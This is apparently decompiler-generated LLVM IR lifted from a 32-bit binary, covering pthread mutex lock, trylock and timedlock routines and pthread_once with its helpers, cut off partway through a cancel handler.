define i32 @pthread_mutex_trylock(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8059544 = load i32, i32* @edi, align 4
  %v0_8059545 = load i32, i32* @esi, align 4
  %v0_8059546 = load i32, i32* @ebx, align 4
  store i32 %v0_8059546, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805954b = add i32 %arg1, 12
  %v2_805954b = inttoptr i32 %v1_805954b to i32*
  %v3_805954b = load i32, i32* %v2_805954b, align 4
  %v1_805954e = add i32 %v3_805954b, -1
  %v5_805954e = icmp eq i32 %v3_805954b, 0
  %v9_805954e = icmp eq i32 %v1_805954e, 0
  br i1 %v9_805954e, label %dec_label_pc_8059577, label %dec_label_pc_8059553

dec_label_pc_8059553:                             ; preds = %entry
  %v6_805954e = sub i32 0, %v3_805954b
  %v7_805954e = and i32 %v3_805954b, %v6_805954e
  %v8_805954e = icmp slt i32 %v7_805954e, 0
  %v10_805954e = icmp slt i32 %v1_805954e, 0
  %v3_8059553 = icmp eq i1 %v10_805954e, %v8_805954e
  br i1 %v3_8059553, label %dec_label_pc_805955b, label %dec_label_pc_8059555

dec_label_pc_8059555:                             ; preds = %dec_label_pc_8059553
  br i1 %v5_805954e, label %dec_label_pc_805956c, label %dec_label_pc_8059565

dec_label_pc_805955b:                             ; preds = %dec_label_pc_8059553
  %v9_805955b = icmp eq i32 %v3_805954b, 2
  br i1 %v9_805955b, label %dec_label_pc_80595a4, label %dec_label_pc_8059560

dec_label_pc_8059560:                             ; preds = %dec_label_pc_805955b
  %v9_8059560 = icmp eq i32 %v3_805954b, 3
  br i1 %v9_8059560, label %dec_label_pc_80595bc, label %dec_label_pc_8059565

dec_label_pc_8059565:                             ; preds = %dec_label_pc_8059555, %dec_label_pc_8059560
  store i32 22, i32* @esi, align 4
  br label %dec_label_pc_80595c7

dec_label_pc_805956c:                             ; preds = %dec_label_pc_8059555
  %v1_805956c = add i32 %arg1, 16
  store i32 %v1_805956c, i32* @eax, align 4
  store i32 %v0_8059546, i32* @ebx, align 4
  %v3_8059572 = call i32 @__pthread_trylock(i32 %v0_8059546, i32 %v0_8059545, i32 %v0_8059544)
  %v0_8059577.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8059577

dec_label_pc_8059577:                             ; preds = %entry, %dec_label_pc_805956c
  %v0_8059577 = phi i32 [ %v0_8059546, %entry ], [ %v0_8059577.pre, %dec_label_pc_805956c ]
  %v1_8059577 = call i32 @thread_self.19(i32 %v0_8059577)
  store i32 %v1_8059577, i32* %edi.global-to-local, align 4
  %v0_805957e = load i32, i32* @ebx, align 4
  %v1_805957e = add i32 %v0_805957e, 8
  %v2_805957e = inttoptr i32 %v1_805957e to i32*
  %v3_805957e = load i32, i32* %v2_805957e, align 4
  %v15_805957e = icmp eq i32 %v3_805957e, %v1_8059577
  %v1_8059581 = icmp eq i1 %v15_805957e, false
  br i1 %v1_8059581, label %dec_label_pc_805958a, label %dec_label_pc_8059583

dec_label_pc_8059583:                             ; preds = %dec_label_pc_8059577
  %v1_8059583 = add i32 %v0_805957e, 4
  %v2_8059583 = inttoptr i32 %v1_8059583 to i32*
  %v3_8059583 = load i32, i32* %v2_8059583, align 4
  %v4_8059583 = add i32 %v3_8059583, 1
  store i32 %v4_8059583, i32* %v2_8059583, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80595c7

dec_label_pc_805958a:                             ; preds = %dec_label_pc_8059577
  %v1_805958a = add i32 %v0_805957e, 16
  store i32 %v1_805958a, i32* @eax, align 4
  %v0_805958d = load i32, i32* %stack_var_-12, align 4
  %v3_805958d = call i32 @__pthread_trylock(i32 %v0_805958d, i32 %v0_8059545, i32 %v0_8059544)
  store i32 %v3_805958d, i32* @esi, align 4
  %v1_8059594 = icmp eq i32 %v3_805958d, 0
  %v1_8059596 = icmp eq i1 %v1_8059594, false
  br i1 %v1_8059596, label %dec_label_pc_80595c7, label %dec_label_pc_8059598

dec_label_pc_8059598:                             ; preds = %dec_label_pc_805958a
  %v0_8059598 = load i32, i32* %edi.global-to-local, align 4
  %v1_8059598 = load i32, i32* @ebx, align 4
  %v2_8059598 = add i32 %v1_8059598, 8
  %v3_8059598 = inttoptr i32 %v2_8059598 to i32*
  store i32 %v0_8059598, i32* %v3_8059598, align 4
  %v0_805959b = load i32, i32* @ebx, align 4
  %v1_805959b = add i32 %v0_805959b, 4
  %v2_805959b = inttoptr i32 %v1_805959b to i32*
  store i32 0, i32* %v2_805959b, align 4
  br label %dec_label_pc_80595c7

dec_label_pc_80595a4:                             ; preds = %dec_label_pc_805955b
  %v1_80595a4 = add i32 %arg1, 16
  store i32 %v1_80595a4, i32* @eax, align 4
  %v3_80595a7 = call i32 @__pthread_alt_trylock(i32 %v0_8059546, i32 %v0_8059545, i32 %v0_8059544)
  store i32 %v3_80595a7, i32* @esi, align 4
  %v1_80595ae = icmp eq i32 %v3_80595a7, 0
  %v1_80595b0 = icmp eq i1 %v1_80595ae, false
  br i1 %v1_80595b0, label %dec_label_pc_80595c7, label %dec_label_pc_80595b2

dec_label_pc_80595b2:                             ; preds = %dec_label_pc_80595a4
  %v0_80595b2 = load i32, i32* %stack_var_-12, align 4
  %v1_80595b2 = call i32 @thread_self.19(i32 %v0_80595b2)
  %v1_80595b7 = load i32, i32* @ebx, align 4
  %v2_80595b7 = add i32 %v1_80595b7, 8
  %v3_80595b7 = inttoptr i32 %v2_80595b7 to i32*
  store i32 %v1_80595b2, i32* %v3_80595b7, align 4
  br label %dec_label_pc_80595c7

dec_label_pc_80595bc:                             ; preds = %dec_label_pc_8059560
  %v1_80595bc = add i32 %arg1, 16
  store i32 %v1_80595bc, i32* @eax, align 4
  store i32 %v0_8059546, i32* @ebx, align 4
  %v3_80595c2 = call i32 @__pthread_alt_trylock(i32 %v0_8059546, i32 %v0_8059545, i32 %v0_8059544)
  br label %dec_label_pc_80595c7

dec_label_pc_80595c7:                             ; preds = %dec_label_pc_80595a4, %dec_label_pc_805958a, %dec_label_pc_80595b2, %dec_label_pc_8059598, %dec_label_pc_8059583, %dec_label_pc_8059565, %dec_label_pc_80595bc
  %v0_80595c7 = load i32, i32* @esi, align 4
  %v2_80595c9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80595c9, i32* @ebx, align 4
  store i32 %v0_8059545, i32* @esi, align 4
  store i32 %v0_8059544, i32* @edi, align 4
  ret i32 %v0_80595c7

; uselistorder directives
  uselistorder i32 %v1_805954e, { 1, 0 }
  uselistorder i32 %v3_805954b, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_8059546, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_8059545, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_8059544, { 0, 3, 2, 1, 4 }
  uselistorder i32* %stack_var_-12, { 3, 1, 2, 0, 4 }
  uselistorder i32 (i32, i32, i32)* @__pthread_alt_trylock, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_80595c7, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_8059577, { 1, 0 }
  uselistorder label %dec_label_pc_8059565, { 1, 0 }
}

define i32 @pthread_mutex_timedlock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_80595cf = load i32, i32* @ebx, align 4
  store i32 %v0_80595cf, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_80595d8 = add i32 %arg2, 4
  %v2_80595d8 = inttoptr i32 %v1_80595d8 to i32*
  %v3_80595d8 = load i32, i32* %v2_80595d8, align 4
  %v6_80595df = icmp ugt i32 %v3_80595d8, 999999999
  br i1 %v6_80595df, label %dec_label_pc_805967a, label %dec_label_pc_80595e5

dec_label_pc_80595e5:                             ; preds = %entry
  %v1_80595e5 = add i32 %arg1, 12
  %v2_80595e5 = inttoptr i32 %v1_80595e5 to i32*
  %v3_80595e5 = load i32, i32* %v2_80595e5, align 4
  %v1_80595e8 = add i32 %v3_80595e5, -1
  %v5_80595e8 = icmp eq i32 %v3_80595e5, 0
  %v9_80595e8 = icmp eq i32 %v1_80595e8, 0
  br i1 %v9_80595e8, label %dec_label_pc_8059610, label %dec_label_pc_80595ed

dec_label_pc_80595ed:                             ; preds = %dec_label_pc_80595e5
  %v6_80595e8 = sub i32 0, %v3_80595e5
  %v7_80595e8 = and i32 %v3_80595e5, %v6_80595e8
  %v8_80595e8 = icmp slt i32 %v7_80595e8, 0
  %v10_80595e8 = icmp slt i32 %v1_80595e8, 0
  %v3_80595ed = icmp eq i1 %v10_80595e8, %v8_80595e8
  br i1 %v3_80595ed, label %dec_label_pc_80595f8, label %dec_label_pc_80595ef

dec_label_pc_80595ef:                             ; preds = %dec_label_pc_80595ed
  br i1 %v5_80595e8, label %dec_label_pc_8059604, label %dec_label_pc_805967a

dec_label_pc_80595f8:                             ; preds = %dec_label_pc_80595ed
  %v9_80595f8 = icmp eq i32 %v3_80595e5, 2
  br i1 %v9_80595f8, label %dec_label_pc_8059639, label %dec_label_pc_80595fd

dec_label_pc_80595fd:                             ; preds = %dec_label_pc_80595f8
  %v9_80595fd = icmp eq i32 %v3_80595e5, 3
  %v1_8059600 = icmp eq i1 %v9_80595fd, false
  br i1 %v1_8059600, label %dec_label_pc_805967a, label %dec_label_pc_8059662

dec_label_pc_8059604:                             ; preds = %dec_label_pc_80595ef
  %v1_8059604 = add i32 %arg1, 16
  store i32 %v1_8059604, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_8059609 = call i32 @__pthread_lock(i32 %v0_80595cf)
  br label %dec_label_pc_805961f

dec_label_pc_8059610:                             ; preds = %dec_label_pc_80595e5
  %v1_8059610 = call i32 @thread_self.19(i32 %v0_80595cf)
  store i32 %v1_8059610, i32* @ebx, align 4
  %v0_8059617 = load i32, i32* @esi, align 4
  %v1_8059617 = add i32 %v0_8059617, 8
  %v2_8059617 = inttoptr i32 %v1_8059617 to i32*
  %v3_8059617 = load i32, i32* %v2_8059617, align 4
  %v15_8059617 = icmp eq i32 %v3_8059617, %v1_8059610
  %v1_805961a = icmp eq i1 %v15_8059617, false
  br i1 %v1_805961a, label %dec_label_pc_8059623, label %dec_label_pc_805961c

dec_label_pc_805961c:                             ; preds = %dec_label_pc_8059610
  %v1_805961c = add i32 %v0_8059617, 4
  %v2_805961c = inttoptr i32 %v1_805961c to i32*
  %v3_805961c = load i32, i32* %v2_805961c, align 4
  %v4_805961c = add i32 %v3_805961c, 1
  store i32 %v4_805961c, i32* %v2_805961c, align 4
  br label %dec_label_pc_805961f

dec_label_pc_805961f:                             ; preds = %dec_label_pc_805965d, %dec_label_pc_8059623, %dec_label_pc_8059604, %dec_label_pc_805961c
  br label %dec_label_pc_8059686

dec_label_pc_8059623:                             ; preds = %dec_label_pc_8059610
  %v1_8059623 = add i32 %v0_8059617, 16
  store i32 %v1_8059623, i32* @eax, align 4
  store i32 %v1_8059610, i32* @edx, align 4
  %v0_8059628 = load i32, i32* %stack_var_-12, align 4
  %v1_8059628 = call i32 @__pthread_lock(i32 %v0_8059628)
  %v0_805962d = load i32, i32* @ebx, align 4
  %v1_805962d = load i32, i32* @esi, align 4
  %v2_805962d = add i32 %v1_805962d, 8
  %v3_805962d = inttoptr i32 %v2_805962d to i32*
  store i32 %v0_805962d, i32* %v3_805962d, align 4
  %v0_8059630 = load i32, i32* @esi, align 4
  %v1_8059630 = add i32 %v0_8059630, 4
  %v2_8059630 = inttoptr i32 %v1_8059630 to i32*
  store i32 0, i32* %v2_8059630, align 4
  br label %dec_label_pc_805961f

dec_label_pc_8059639:                             ; preds = %dec_label_pc_80595f8
  %v1_8059639 = call i32 @thread_self.19(i32 %v0_80595cf)
  store i32 %v1_8059639, i32* @ebx, align 4
  %v0_8059645 = load i32, i32* @esi, align 4
  %v1_8059645 = add i32 %v0_8059645, 8
  %v2_8059645 = inttoptr i32 %v1_8059645 to i32*
  %v3_8059645 = load i32, i32* %v2_8059645, align 4
  %v15_8059645 = icmp eq i32 %v3_8059645, %v1_8059639
  br i1 %v15_8059645, label %dec_label_pc_8059686, label %dec_label_pc_805964a

dec_label_pc_805964a:                             ; preds = %dec_label_pc_8059639
  %v1_805964b = add i32 %v0_8059645, 16
  %v0_805964e = load i32, i32* @edi, align 4
  %v4_8059651 = inttoptr i32 %v1_805964b to i32*
  %v5_8059651 = call i32 @__pthread_alt_timedlock(i32* %v4_8059651, i32 %v1_8059639, i32 %v0_805964e, i32 %v1_8059639)
  %v1_8059659 = icmp eq i32 %v5_8059651, 0
  br i1 %v1_8059659, label %dec_label_pc_8059681, label %dec_label_pc_805965d

dec_label_pc_805965d:                             ; preds = %dec_label_pc_805964a
  %v0_805965d = load i32, i32* @ebx, align 4
  %v1_805965d = load i32, i32* @esi, align 4
  %v2_805965d = add i32 %v1_805965d, 8
  %v3_805965d = inttoptr i32 %v2_805965d to i32*
  store i32 %v0_805965d, i32* %v3_805965d, align 4
  br label %dec_label_pc_805961f

dec_label_pc_8059662:                             ; preds = %dec_label_pc_80595fd
  %v1_8059662 = add i32 %arg1, 16
  %v0_8059665 = load i32, i32* @ecx, align 4
  %v4_805966a = inttoptr i32 %v1_8059662 to i32*
  %v5_805966a = call i32 @__pthread_alt_timedlock(i32* %v4_805966a, i32 0, i32 %arg2, i32 %v0_8059665)
  %v1_8059674 = icmp eq i32 %v5_805966a, 0
  %v1_8059676 = icmp eq i1 %v1_8059674, false
  br i1 %v1_8059676, label %dec_label_pc_8059686, label %dec_label_pc_8059681

dec_label_pc_805967a:                             ; preds = %dec_label_pc_80595ef, %dec_label_pc_80595fd, %entry
  br label %dec_label_pc_8059686

dec_label_pc_8059681:                             ; preds = %dec_label_pc_8059662, %dec_label_pc_805964a
  br label %dec_label_pc_8059686

dec_label_pc_8059686:                             ; preds = %dec_label_pc_8059662, %dec_label_pc_8059639, %dec_label_pc_805967a, %dec_label_pc_805961f, %dec_label_pc_8059681
  %v0_8059686 = phi i32 [ 0, %dec_label_pc_8059662 ], [ 35, %dec_label_pc_8059639 ], [ 22, %dec_label_pc_805967a ], [ 0, %dec_label_pc_805961f ], [ 110, %dec_label_pc_8059681 ]
  ret i32 %v0_8059686

; uselistorder directives
  uselistorder i32 %v1_8059639, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8059610, { 1, 0, 2 }
  uselistorder i32 %v1_80595e8, { 1, 0 }
  uselistorder i32 %v3_80595e5, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_80595cf, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8059686, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805967a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805961f, { 0, 1, 3, 2 }
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805968c = load i32, i32* @esi, align 4
  %v0_805968d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8059695 = add i32 %arg1, 12
  %v2_8059695 = inttoptr i32 %v1_8059695 to i32*
  %v3_8059695 = load i32, i32* %v2_8059695, align 4
  %v1_8059698 = add i32 %v3_8059695, -1
  %v5_8059698 = icmp eq i32 %v3_8059695, 0
  %v9_8059698 = icmp eq i32 %v1_8059698, 0
  br i1 %v9_8059698, label %dec_label_pc_80596c2, label %dec_label_pc_805969d

dec_label_pc_805969d:                             ; preds = %entry
  %v6_8059698 = sub i32 0, %v3_8059695
  %v7_8059698 = and i32 %v3_8059695, %v6_8059698
  %v8_8059698 = icmp slt i32 %v7_8059698, 0
  %v10_8059698 = icmp slt i32 %v1_8059698, 0
  %v3_805969d = icmp eq i1 %v10_8059698, %v8_8059698
  br i1 %v3_805969d, label %dec_label_pc_80596a5, label %dec_label_pc_805969f

dec_label_pc_805969f:                             ; preds = %dec_label_pc_805969d
  br i1 %v5_8059698, label %dec_label_pc_80596b6, label %dec_label_pc_80596af

dec_label_pc_80596a5:                             ; preds = %dec_label_pc_805969d
  %v9_80596a5 = icmp eq i32 %v3_8059695, 2
  br i1 %v9_80596a5, label %dec_label_pc_80596eb, label %dec_label_pc_80596aa

dec_label_pc_80596aa:                             ; preds = %dec_label_pc_80596a5
  %v9_80596aa = icmp eq i32 %v3_8059695, 3
  br i1 %v9_80596aa, label %dec_label_pc_805970d, label %dec_label_pc_80596af

dec_label_pc_80596af:                             ; preds = %dec_label_pc_805969f, %dec_label_pc_80596aa
  br label %dec_label_pc_805971f

dec_label_pc_80596b6:                             ; preds = %dec_label_pc_805969f
  %v1_80596b6 = add i32 %arg1, 16
  store i32 %v1_80596b6, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_80596bb = call i32 @__pthread_lock(i32 %v0_805968d)
  br label %dec_label_pc_80596d1

dec_label_pc_80596c2:                             ; preds = %entry
  %v1_80596c2 = call i32 @thread_self.19(i32 %v0_805968d)
  store i32 %v1_80596c2, i32* @ebx, align 4
  %v0_80596c9 = load i32, i32* @esi, align 4
  %v1_80596c9 = add i32 %v0_80596c9, 8
  %v2_80596c9 = inttoptr i32 %v1_80596c9 to i32*
  %v3_80596c9 = load i32, i32* %v2_80596c9, align 4
  %v15_80596c9 = icmp eq i32 %v3_80596c9, %v1_80596c2
  %v1_80596cc = icmp eq i1 %v15_80596c9, false
  br i1 %v1_80596cc, label %dec_label_pc_80596d5, label %dec_label_pc_80596ce

dec_label_pc_80596ce:                             ; preds = %dec_label_pc_80596c2
  %v1_80596ce = add i32 %v0_80596c9, 4
  %v2_80596ce = inttoptr i32 %v1_80596ce to i32*
  %v3_80596ce = load i32, i32* %v2_80596ce, align 4
  %v4_80596ce = add i32 %v3_80596ce, 1
  store i32 %v4_80596ce, i32* %v2_80596ce, align 4
  br label %dec_label_pc_80596d1

dec_label_pc_80596d1:                             ; preds = %dec_label_pc_80596d5, %dec_label_pc_80596b6, %dec_label_pc_80596ce
  br label %dec_label_pc_805971f

dec_label_pc_80596d5:                             ; preds = %dec_label_pc_80596c2
  %v1_80596d5 = add i32 %v0_80596c9, 16
  store i32 %v1_80596d5, i32* @eax, align 4
  store i32 %v1_80596c2, i32* @edx, align 4
  %v1_80596da = call i32 @__pthread_lock(i32 %v0_805968d)
  %v0_80596df = load i32, i32* @ebx, align 4
  %v1_80596df = load i32, i32* @esi, align 4
  %v2_80596df = add i32 %v1_80596df, 8
  %v3_80596df = inttoptr i32 %v2_80596df to i32*
  store i32 %v0_80596df, i32* %v3_80596df, align 4
  %v0_80596e2 = load i32, i32* @esi, align 4
  %v1_80596e2 = add i32 %v0_80596e2, 4
  %v2_80596e2 = inttoptr i32 %v1_80596e2 to i32*
  store i32 0, i32* %v2_80596e2, align 4
  br label %dec_label_pc_80596d1

dec_label_pc_80596eb:                             ; preds = %dec_label_pc_80596a5
  %v1_80596eb = call i32 @thread_self.19(i32 %v0_805968d)
  store i32 %v1_80596eb, i32* @ebx, align 4
  %v0_80596f7 = load i32, i32* @esi, align 4
  %v1_80596f7 = add i32 %v0_80596f7, 8
  %v2_80596f7 = inttoptr i32 %v1_80596f7 to i32*
  %v3_80596f7 = load i32, i32* %v2_80596f7, align 4
  %v15_80596f7 = icmp eq i32 %v3_80596f7, %v1_80596eb
  br i1 %v15_80596f7, label %dec_label_pc_805971f, label %dec_label_pc_80596fc

dec_label_pc_80596fc:                             ; preds = %dec_label_pc_80596eb
  %v1_80596fe = add i32 %v0_80596f7, 16
  %v3_8059703 = inttoptr i32 %v1_80596fe to i32*
  %v4_8059703 = call i32 @__pthread_alt_lock(i32* %v3_8059703, i32 %v1_80596eb, i32 35)
  %v0_8059708 = load i32, i32* @ebx, align 4
  %v1_8059708 = load i32, i32* @esi, align 4
  %v2_8059708 = add i32 %v1_8059708, 8
  %v3_8059708 = inttoptr i32 %v2_8059708 to i32*
  store i32 %v0_8059708, i32* %v3_8059708, align 4
  br label %dec_label_pc_805971a

dec_label_pc_805970d:                             ; preds = %dec_label_pc_80596aa
  %v1_805970d = add i32 %arg1, 16
  %v0_8059710 = load i32, i32* @ecx, align 4
  %v3_8059715 = inttoptr i32 %v1_805970d to i32*
  %v4_8059715 = call i32 @__pthread_alt_lock(i32* %v3_8059715, i32 0, i32 %v0_8059710)
  br label %dec_label_pc_805971a

dec_label_pc_805971a:                             ; preds = %dec_label_pc_80596fc, %dec_label_pc_805970d
  br label %dec_label_pc_805971f

dec_label_pc_805971f:                             ; preds = %dec_label_pc_80596eb, %dec_label_pc_80596d1, %dec_label_pc_80596af, %dec_label_pc_805971a
  %v0_8059722 = phi i32 [ 35, %dec_label_pc_80596eb ], [ 0, %dec_label_pc_80596d1 ], [ 22, %dec_label_pc_80596af ], [ 0, %dec_label_pc_805971a ]
  %v2_805971f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805971f, i32* @edx, align 4
  store i32 %v0_805968d, i32* @ebx, align 4
  store i32 %v0_805968c, i32* @esi, align 4
  ret i32 %v0_8059722

; uselistorder directives
  uselistorder i32 %v1_80596eb, { 1, 0, 2 }
  uselistorder i32 %v1_80596c2, { 1, 0, 2 }
  uselistorder i32 %v1_8059698, { 1, 0 }
  uselistorder i32 %v3_8059695, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_805968d, { 0, 3, 1, 2, 4 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_alt_lock, { 1, 2, 0 }
  uselistorder i32 (i32)* @thread_self.19, { 2, 1, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 (i32)* @__pthread_lock, { 1, 0, 29, 28, 27, 9, 26, 25, 33, 10, 8, 24, 23, 22, 11, 6, 7, 21, 20, 19, 17, 32, 16, 18, 15, 35, 34, 13, 14, 31, 12, 5, 3, 2, 30, 4 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805971f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805971a, { 1, 0 }
  uselistorder label %dec_label_pc_80596d1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80596af, { 1, 0 }
}

define i32 @__pthread_once_fork_prepare() local_unnamed_addr {
entry:
  %v1_805972b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807a63c.713 to i32))
  ret i32 %v1_805972b
}

define i32 @pthread_once(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v0_8059734 = load i32, i32* @esi, align 4
  store i32 %tmp3, i32* @esi, align 4
  %v2_805973d = load i32, i32* %arg1, align 4
  %v11_805973d = icmp eq i32 %v2_805973d, 2
  %v1_8059740 = icmp eq i1 %v11_805973d, false
  br i1 %v1_8059740, label %dec_label_pc_8059747, label %dec_label_pc_805980e

dec_label_pc_8059747:                             ; preds = %entry
  %v1_805974f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807a63c.713 to i32))
  %v0_8059754 = load i32, i32* @esi, align 4
  %v1_8059754 = inttoptr i32 %v0_8059754 to i32*
  %v2_8059754 = load i32, i32* %v1_8059754, align 4
  %v1_805975b = urem i32 %v2_8059754, 4
  %v8_805975e = icmp eq i32 %v1_805975b, 1
  %v1_805975f = icmp eq i1 %v8_805975e, false
  br i1 %v1_805975f, label %dec_label_pc_8059788.preheader, label %dec_label_pc_8059761

dec_label_pc_8059761:                             ; preds = %dec_label_pc_8059747
  %v1_8059761 = and i32 %v2_8059754, -4
  %v1_8059764 = load i32, i32* @global_var_807a660.715, align 32
  %v12_8059764 = icmp eq i32 %v1_8059761, %v1_8059764
  br i1 %v12_8059764, label %dec_label_pc_8059788.preheader, label %dec_label_pc_805976c

dec_label_pc_805976c:                             ; preds = %dec_label_pc_8059761
  store i32 0, i32* %v1_8059754, align 4
  %v0_805978814.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8059788.preheader

dec_label_pc_8059788.preheader:                   ; preds = %dec_label_pc_805976c, %dec_label_pc_8059747, %dec_label_pc_8059761
  %v0_805978814 = phi i32 [ %v0_805978814.pre, %dec_label_pc_805976c ], [ %v0_8059754, %dec_label_pc_8059747 ], [ %v0_8059754, %dec_label_pc_8059761 ]
  %v1_805978815 = inttoptr i32 %v0_805978814 to i32*
  %v2_805978816 = load i32, i32* %v1_805978815, align 4
  %v1_805978c17 = urem i32 %v2_805978816, 4
  %v8_805978f19 = icmp eq i32 %v1_805978c17, 1
  br i1 %v8_805978f19, label %dec_label_pc_8059774, label %dec_label_pc_8059792

dec_label_pc_8059774:                             ; preds = %dec_label_pc_8059788.preheader, %dec_label_pc_8059774
  %v0_8059774 = load i32, i32* @ecx, align 4
  %v4_8059780 = call i32 @__GI_pthread_cond_wait(i32 ptrtoint (i32* @global_var_807a654.714 to i32), i32 ptrtoint (i32* @global_var_807a63c.713 to i32), i32 %v0_8059774, i32 %v0_8059774)
  %v0_8059788 = load i32, i32* @esi, align 4
  %v1_8059788 = inttoptr i32 %v0_8059788 to i32*
  %v2_8059788 = load i32, i32* %v1_8059788, align 4
  %v1_805978c = urem i32 %v2_8059788, 4
  %v8_805978f = icmp eq i32 %v1_805978c, 1
  br i1 %v8_805978f, label %dec_label_pc_8059774, label %dec_label_pc_8059792

dec_label_pc_8059792:                             ; preds = %dec_label_pc_8059774, %dec_label_pc_8059788.preheader
  %v1_8059788.lcssa = phi i32* [ %v1_805978815, %dec_label_pc_8059788.preheader ], [ %v1_8059788, %dec_label_pc_8059774 ]
  %v2_8059788.lcssa = phi i32 [ %v2_805978816, %dec_label_pc_8059788.preheader ], [ %v2_8059788, %dec_label_pc_8059774 ]
  store i32 0, i32* @ebx, align 4
  %v1_8059794 = icmp eq i32 %v2_8059788.lcssa, 0
  %v1_8059796 = icmp eq i1 %v1_8059794, false
  br i1 %v1_8059796, label %dec_label_pc_8059792.dec_label_pc_80597ea_crit_edge, label %dec_label_pc_8059798

dec_label_pc_8059792.dec_label_pc_80597ea_crit_edge: ; preds = %dec_label_pc_8059792
  br label %dec_label_pc_80597ea

dec_label_pc_8059798:                             ; preds = %dec_label_pc_8059792
  %v0_805979b = load i32, i32* @global_var_807a660.715, align 32
  %v1_80597a0 = or i32 %v0_805979b, 1
  store i32 %v1_80597a0, i32* %v1_8059788.lcssa, align 4
  %v1_80597aa = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807a63c.713 to i32))
  %v0_80597b2 = load i32, i32* @esi, align 4
  %v2_80597b8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80597b8, i32* @ebx, align 4
  %v4_80597bd = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-24, i32 134584342, i32 %v0_80597b2)
  call void @__pseudo_call(i32 %tmp3)
  %v3_80597cb = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-24, i32 0)
  %v1_80597d7 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807a63c.713 to i32))
  store i32 1, i32* @ebx, align 4
  %v0_80597e1 = load i32, i32* @esi, align 4
  %v1_80597e1 = inttoptr i32 %v0_80597e1 to i32*
  store i32 2, i32* %v1_80597e1, align 4
  br label %dec_label_pc_80597ea

dec_label_pc_80597ea:                             ; preds = %dec_label_pc_8059792.dec_label_pc_80597ea_crit_edge, %dec_label_pc_8059798
  %v1_80597f2 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807a63c.713 to i32))
  %v0_80597fa = load i32, i32* @ebx, align 4
  %v1_80597fa = icmp eq i32 %v0_80597fa, 0
  br i1 %v1_80597fa, label %dec_label_pc_805980e, label %dec_label_pc_80597fe

dec_label_pc_80597fe:                             ; preds = %dec_label_pc_80597ea
  %v1_8059806 = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_807a654.714 to i32))
  br label %dec_label_pc_805980e

dec_label_pc_805980e:                             ; preds = %entry, %dec_label_pc_80597ea, %dec_label_pc_80597fe
  store i32 %v0_8059734, i32* @esi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8059788, { 1, 0 }
  uselistorder i32 %v2_805978816, { 1, 0 }
  uselistorder i32 %v2_8059754, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i32* @global_var_807a660.715, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805980e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80597ea, { 1, 0 }
  uselistorder label %dec_label_pc_8059774, { 1, 0 }
  uselistorder label %dec_label_pc_8059788.preheader, { 0, 2, 1 }
}

define i32 @pthread_once_cancelhandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8059816 = load i32, i32* @ebx, align 4
  store i32 %v0_8059816, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8059823 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807a63c.713 to i32))
  %v0_8059828 = load i32, i32* @ebx, align 4
  %v1_8059828 = inttoptr i32 %v0_8059828 to i32*
  store i32 0, i32* %v1_8059828, align 4
  %v1_8059835 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807a63c.713 to i32))
  %v2_8059845 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059845, i32* @ebx, align 4
  %v1_8059846 = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_807a654.714 to i32))
